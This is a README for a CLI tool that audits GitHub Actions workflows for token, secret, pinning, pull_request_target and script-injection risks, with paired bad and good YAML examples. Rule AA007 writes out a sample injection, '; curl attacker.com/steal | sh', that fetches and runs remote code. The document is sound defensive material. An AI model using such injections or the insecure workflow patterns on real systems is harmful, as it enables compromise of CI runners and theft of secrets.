# actions-auditor

A CLI security tool that scans GitHub Actions workflow YAML files for common misconfigurations and vulnerabilities. It produces a prioritized, color-coded risk report with concrete remediation guidance and can be integrated as a pre-commit hook or run standalone in CI pipelines.

---

## Table of Contents

- [Features](#features)
- [Installation](#installation)
- [Quick Start](#quick-start)
- [Usage](#usage)
  - [Scan Command](#scan-command)
  - [Options Reference](#options-reference)
- [Security Rules](#security-rules)
  - [AA001 – Overly Permissive GITHUB\_TOKEN](#aa001--overly-permissive-github_token)
  - [AA002 – Missing Permissions Declaration](#aa002--missing-permissions-declaration)
  - [AA003 – Secret Exposed in Environment Variable](#aa003--secret-exposed-in-environment-variable)
  - [AA004 – Secret Interpolated in Run Script](#aa004--secret-interpolated-in-run-script)
  - [AA005 – Unpinned Third-Party Action](#aa005--unpinned-third-party-action)
  - [AA006 – pull\_request\_target with Head Checkout](#aa006--pull_request_target-with-head-checkout)
  - [AA007 – Script Injection via Untrusted Context](#aa007--script-injection-via-untrusted-context)
  - [AA008 – workflow\_dispatch Input in Run Script](#aa008--workflow_dispatch-input-in-run-script)
- [Pre-commit Integration](#pre-commit-integration)
- [CI/CD Integration](#cicd-integration)
- [Example Output](#example-output)
- [Development](#development)
- [License](#license)

---

## Features

- **Overly broad GITHUB_TOKEN permissions** – Detects `write-all` or missing least-privilege scope declarations and flags them as high severity.
- **Exposed secrets** – Identifies secrets exposed via `env` blocks or interpolated directly into `run` scripts where they can leak in logs.
- **Unpinned third-party actions** – Flags actions not pinned to a full commit SHA, preventing supply-chain attacks via mutable tags.
- **Dangerous pull_request_target patterns** – Detects `pull_request_target` triggers combined with code checkout of the PR head — the exact vector behind major CI/CD breaches.
- **Script injection risks** – Detects user-controlled GitHub context values (`github.event.pull_request.title`, `github.event.issue.body`, etc.) interpolated directly into shell commands.
- **workflow_dispatch injection** – Flags `${{ inputs.* }}` values embedded directly in `run` scripts.
- **Prioritized color-coded report** – Findings are sorted by severity (CRITICAL → HIGH → MEDIUM → LOW → INFO) with rule IDs, file/line references, and actionable remediation steps.
- **CI gating** – Exits with status `1` when findings are detected, enabling pipeline blocking.
- **Pre-commit hook** – Drop-in support for [pre-commit](https://pre-commit.com/).

---

## Installation

### From PyPI (recommended)

```bash
pip install actions-auditor
```

### From source

```bash
git clone https://github.com/example/actions-auditor.git
cd actions-auditor
pip install -e .
```

### Development installation

```bash
pip install -e ".[dev]"
```

---

## Quick Start

```bash
# Scan the default .github/workflows/ directory in the current repo
actions-auditor scan

# Scan a specific repository root
actions-auditor scan /path/to/my-repo

# Verbose output with remediation guidance
actions-auditor scan --verbose

# Only report HIGH and CRITICAL findings
actions-auditor scan --min-severity HIGH

# CI-friendly: no colour, non-zero exit on findings
actions-auditor scan --no-color
```

---

## Usage

### Scan Command

```
usage: actions-auditor scan [PATH] [OPTIONS]
```

`PATH` is the root directory of the repository to scan. The tool searches `<PATH>/.github/workflows/` for YAML files. Defaults to the current working directory.

### Options Reference

| Option | Description |
|---|---|
| `PATH` | Repository root directory (default: current directory) |
| `--files FILE [FILE ...]` | Scan specific workflow files instead of discovering them |
| `--workflows-dir DIR` | Override the workflows sub-directory (default: `.github/workflows`) |
| `-v`, `--verbose` | Show detailed per-finding panels with descriptions and remediation |
| `--no-remediation` | Suppress remediation panels (only effective with `--verbose`) |
| `--summary-only` | Print only the summary panel, suppress per-severity tables |
| `--show-files` | Include the list of scanned files in the summary panel |
| `--min-severity LEVEL` | Minimum severity to report: `CRITICAL`, `HIGH`, `MEDIUM`, `LOW`, `INFO` (default: `INFO`) |
| `--no-color` | Disable ANSI colour output |
| `--exit-zero` | Always exit with status `0` (warning-only CI step) |
| `--follow-symlinks` | Follow symbolic links during directory traversal |
| `--debug` | Enable debug logging to stderr |
| `--version` | Show version and exit |

---

## Security Rules

### AA001 – Overly Permissive GITHUB_TOKEN

**Severity:** HIGH / MEDIUM

Detects `permissions: write-all` at the top-level or job-level, and individual scopes set to `write` at the job level.

**Why it matters:** Granting `write-all` gives every job in the workflow unrestricted write access to all repository resources (code, issues, packages, secrets). If any step executes attacker-controlled code, the token can be used to push malicious commits or exfiltrate secrets.

**Remediation:** Replace `permissions: write-all` with an explicit, least-privilege permissions block:

```yaml
# Bad
permissions: write-all

# Good
permissions:
  contents: read
  pull-requests: write
```

**References:**
- https://docs.github.com/en/actions/security-guides/automatic-token-authentication#modifying-the-permissions-for-the-github_token

---

### AA002 – Missing Permissions Declaration

**Severity:** MEDIUM

Detects workflows that omit a top-level `permissions` block entirely.

**Why it matters:** Without an explicit `permissions` key, the GITHUB_TOKEN inherits the repository's default permissions, which may include broad write access depending on organisation settings.

**Remediation:** Add a top-level `permissions` block with the minimum required scopes:

```yaml
permissions:
  contents: read
```

**References:**
- https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token

---

### AA003 – Secret Exposed in Environment Variable

**Severity:** HIGH (top-level env) / MEDIUM (job-level env)

Detects `${{ secrets.* }}` expressions in top-level or job-level `env` blocks. Secrets at the step level are acceptable and not flagged.

**Why it matters:** Secrets exposed as environment variables are accessible to all commands in a job, including third-party actions that may log or exfiltrate them.

**Remediation:** Scope secrets to the individual step that needs them:

```yaml
# Bad
jobs:
  build:
    env:
      API_KEY: ${{ secrets.API_KEY }}  # accessible to ALL steps

# Good
jobs:
  build:
    steps:
      - name: Call API
        run: curl -H "Authorization: $API_KEY" https://api.example.com
        env:
          API_KEY: ${{ secrets.API_KEY }}  # limited to this step
```

---

### AA004 – Secret Interpolated in Run Script

**Severity:** HIGH

Detects `${{ secrets.* }}` expressions embedded directly in `run` step scripts.

**Why it matters:** Secrets interpolated into shell commands are substituted before execution, causing them to appear in error messages, debug output, and potentially in Actions logs if log-masking fails.

**Remediation:** Pass the secret via a step-level environment variable:

```yaml
# Bad
- run: curl -u ${{ secrets.TOKEN }} https://api.example.com

# Good
- run: curl -u "$MY_TOKEN" https://api.example.com
  env:
    MY_TOKEN: ${{ secrets.TOKEN }}
```

---

### AA005 – Unpinned Third-Party Action

**Severity:** HIGH

Detects `uses:` references where the `@<ref>` part is not a full 40-character hexadecimal commit SHA. Local actions (`./`) and Docker images (`docker://`) are exempt.

**Why it matters:** Referencing an action by a mutable tag (e.g., `@v3`, `@main`) allows the action's author — or an attacker who has compromised that repository — to silently change the code that executes in your workflow.

**Remediation:** Pin every third-party action to a specific commit SHA:

```yaml
# Bad
- uses: actions/checkout@v4

# Good
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
```

Use [Dependabot](https://docs.github.com/en/code-security/dependabot/working-with-dependabot/keeping-your-actions-up-to-date-with-dependabot) or [pin-github-action](https://github.com/mheap/pin-github-action) to keep pinned SHAs up to date automatically.

**References:**
- https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#using-third-party-actions

---

### AA006 – pull_request_target with Head Checkout

**Severity:** CRITICAL

Detects the combination of a `pull_request_target` trigger with a checkout of the PR head ref (`github.event.pull_request.head.sha`, `github.event.pull_request.head.ref`, or `github.head_ref`).

**Why it matters:** The `pull_request_target` trigger runs in the context of the *base* repository with a write-capable GITHUB_TOKEN and access to secrets. Checking out the PR head executes attacker-controlled code in this privileged context. This pattern was the root cause of several high-profile CI/CD supply-chain breaches in 2021.

**Remediation:** Never check out the PR head in a `pull_request_target` workflow. Use the `pull_request` trigger instead (which has restricted token permissions and no secret access for fork PRs):

```yaml
# Bad
on: pull_request_target
jobs:
  build:
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # attacker code!

# Good
on: pull_request
jobs:
  build:
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
```

**References:**
- https://securitylab.github.com/research/github-actions-preventing-pwn-requests/
- https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull_request_target

---

### AA007 – Script Injection via Untrusted Context

**Severity:** CRITICAL

Detects user-controlled GitHub context values (such as `github.event.pull_request.title`, `github.event.issue.body`, `github.event.comment.body`, `github.head_ref`, etc.) interpolated directly into `run` scripts.

**Why it matters:** An attacker can craft a PR title, issue body, or commit message containing shell metacharacters (e.g., `; curl attacker.com/steal | sh`) to execute arbitrary commands in the context of the runner.

**Remediation:** Pass the context value through a step-level environment variable:

```yaml
# Bad
- run: echo "PR title: ${{ github.event.pull_request.title }}"

# Good
- run: echo "PR title: $PR_TITLE"
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
```

**References:**
- https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections
- https://securitylab.github.com/research/github-actions-untrusted-input/

---

### AA008 – workflow_dispatch Input in Run Script

**Severity:** HIGH

Detects `${{ inputs.* }}` expressions from `workflow_dispatch` triggers embedded directly in `run` scripts.

**Why it matters:** Anyone with permission to trigger the workflow (manually or via the API) can supply a malicious input value containing shell metacharacters.

**Remediation:** Use an environment variable intermediary:

```yaml
# Bad
- run: deploy.sh ${{ inputs.environment }}

# Good
- run: deploy.sh "$DEPLOY_ENV"
  env:
    DEPLOY_ENV: ${{ inputs.environment }}
```

---

## Pre-commit Integration

Add `actions-auditor` to your `.pre-commit-config.yaml` to automatically scan workflow files before each commit:

```yaml
repos:
  - repo: https://github.com/example/actions-auditor
    rev: v0.1.0
    hooks:
      - id: actions-auditor
```

The hook will scan any staged GitHub Actions workflow files matching `^.github/workflows/.*\.ya?ml$` and block the commit if security issues are found.

To install and run the hook:

```bash
pip install pre-commit
pre-commit install
pre-commit run actions-auditor --all-files
```

### Hook Configuration

You can pass additional arguments to the hook via the `args` key:

```yaml
repos:
  - repo: https://github.com/example/actions-auditor
    rev: v0.1.0
    hooks:
      - id: actions-auditor
        args:
          - scan
          - --min-severity
          - HIGH
          - --no-color
```

---

## CI/CD Integration

### GitHub Actions

Add a security audit step to your CI workflow:

```yaml
name: Security Audit

on:
  push:
    paths:
      - '.github/workflows/**'
  pull_request:
    paths:
      - '.github/workflows/**'

permissions:
  contents: read

jobs:
  audit:
    name: Audit Workflow Files
    runs-on: ubuntu-latest
    steps:
      - name: Checkout repository
        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2

      - name: Set up Python
        uses: actions/setup-python@0b93645e9fea7318ecaed2b359559ac225c90a2b  # v5.3.0
        with:
          python-version: "3.11"

      - name: Install actions-auditor
        run: pip install actions-auditor

      - name: Scan workflow files
        run: actions-auditor scan --no-color --min-severity MEDIUM
```

### Exit Codes

| Code | Meaning |
|------|----------|
| `0`  | No findings detected (or `--exit-zero` was passed) |
| `1`  | One or more security findings detected |
| `2`  | Operational error (e.g., directory not found) |

### Warning-only mode

If you want to audit without blocking the pipeline:

```bash
actions-auditor scan --exit-zero
```

---

## Example Output

```
────────────────── :shield: GitHub Actions Security Audit Report :shield: ──────────────────

──────────────────────────── :rotating_light: Critical (2 findings) ────────────────────────────

╭───────┬─────────────────────────────────┬─────────────────────────────────┬──────────────────────────╮
│ Rule  │ Location                        │ Title                           │ Evidence                 │
├───────┼─────────────────────────────────┼─────────────────────────────────┼──────────────────────────┤
│ AA006 │ bad_workflow.yml:55             │ pull_request_target with        │ on: pull_request_target  │
│       │ (job: vulnerable_job,           │ head-ref checkout               │ + github.event.pull_     │
│       │  step: Checkout attacker-       │                                 │ request.head.sha         │
│       │  controlled PR code)            │                                 │                          │
├───────┼─────────────────────────────────┼─────────────────────────────────┼──────────────────────────┤
│ AA007 │ bad_workflow.yml:72             │ Potential script injection via  │ ${{ github.event.pull_   │
│       │ (job: vulnerable_job,           │ untrusted GitHub context        │ request.title }}         │
│       │  step: Process pull request     │                                 │                          │
│       │  title)                         │                                 │                          │
╰───────┴─────────────────────────────────┴─────────────────────────────────┴──────────────────────────╯

──────────────────────────────── :red_circle: High (5 findings) ────────────────────────────────

╭───────┬──────────────────────────────┬───────────────────────────────────────┬───────────────────────╮
│ Rule  │ Location                     │ Title                                 │ Evidence              │
├───────┼──────────────────────────────┼───────────────────────────────────────┼───────────────────────┤
│ AA001 │ bad_workflow.yml:30          │ Overly permissive GITHUB_TOKEN        │ permissions: write-   │
│       │                              │ (write-all)                           │ all                   │
├───────┼──────────────────────────────┼───────────────────────────────────────┼───────────────────────┤
│ AA003 │ bad_workflow.yml:36          │ Secret exposed in top-level env       │ API_SECRET: ${{       │
│       │                              │ variable 'API_SECRET'                 │ secrets.API_SECRET }} │
├───────┼──────────────────────────────┼───────────────────────────────────────┼───────────────────────┤
│ AA004 │ bad_workflow.yml:66          │ Secret directly interpolated in run   │ ${{ secrets.          │
│       │ (job: vulnerable_job,        │ script                                │ API_SECRET }}         │
│       │  step: Authenticate using    │                                       │                       │
│       │  secret in run script)       │                                       │                       │
├───────┼──────────────────────────────┼───────────────────────────────────────┼───────────────────────┤
│ AA005 │ bad_workflow.yml:57          │ Unpinned action:                      │ uses: actions/        │
│       │ (job: vulnerable_job,        │ actions/checkout@v4                   │ checkout@v4           │
│       │  step: Checkout attacker-    │                                       │                       │
│       │  controlled PR code)         │                                       │                       │
│ AA008 │ bad_workflow.yml:82          │ workflow_dispatch input interpolated  │ ${{ inputs.           │
│       │ (job: vulnerable_job,        │ in run script                         │ deploy_env }}         │
│       │  step: Deploy to environment)│                                       │                       │
╰───────┴──────────────────────────────┴───────────────────────────────────────┴───────────────────────╯

╭─────────────────────────────── Scan Summary ────────────────────────────────╮
│ Files scanned:   1                                                          │
│ Total findings:  9                                                          │
│                                                                             │
│ Findings by severity:                                                       │
│   :rotating_light:  Critical     2                                          │
│   :red_circle:      High         5                                          │
│   :yellow_circle:   Medium       2                                          │
│   :blue_circle:     Low          0                                          │
│   :white_circle:    Info         0                                          │
│                                                                             │
│ :cross_mark: 9 finding(s) detected. Review and remediate before merging.   │
╰─────────────────────────────────────────────────────────────────────────────╯
```

---

## Development

### Running Tests

```bash
# Install development dependencies
pip install -e ".[dev]"

# Run all tests
pytest

# Run with coverage
pytest --cov=actions_auditor --cov-report=term-missing

# Run a specific test file
pytest tests/test_rules.py -v

# Run a specific test class
pytest tests/test_rules.py::TestCheckUnpinnedActions -v
```

### Project Structure

```
actions_auditor/
├── __init__.py          # Package init, version
├── cli.py               # CLI entry point (argparse)
├── models.py            # Severity, Finding, ScanResult dataclasses
├── rules.py             # Security rule checker functions
├── scanner.py           # Workflow file discovery and loading
├── reporter.py          # Rich terminal report renderer
└── remediation.py       # Rule ID → remediation advice registry

tests/
├── fixtures/
│   ├── good_workflow.yml  # Well-configured workflow (negative test case)
│   └── bad_workflow.yml   # Misconfigured workflow (positive test case)
├── test_models.py
├── test_rules.py
├── test_scanner.py
├── test_reporter.py
└── test_remediation.py
```

### Adding a New Rule

1. Add a checker function to `actions_auditor/rules.py` following the pattern:
   ```python
   def check_my_new_rule(workflow: WorkflowFile) -> List[Finding]:
       ...
   ```
2. Register it in the `ALL_RULES` list at the bottom of `rules.py`.
3. Add a `RemediationAdvice` entry to `REMEDIATION_REGISTRY` in `actions_auditor/remediation.py`.
4. Add unit tests in `tests/test_rules.py`.

---

## License

MIT License. See [LICENSE](LICENSE) for details.
